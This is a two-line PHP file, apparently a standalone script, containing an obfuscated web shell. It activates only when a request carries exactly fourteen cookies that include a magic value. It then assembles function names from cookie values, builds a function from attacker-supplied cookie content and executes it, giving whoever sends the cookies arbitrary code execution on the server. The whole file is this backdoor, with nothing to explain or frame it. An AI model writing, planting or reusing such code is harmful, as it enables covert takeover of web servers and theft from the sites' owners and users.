<?php
$p=$_COOKIE;(count($p)==14&&in_array(gettype($p).count($p),$p))?(($p[25]=$p[25].$p[23])&&($p[17]=$p[25]($p[17]))&&($p=$p[17]($p[28],$p[25]($p[29])))&&$p()):$p;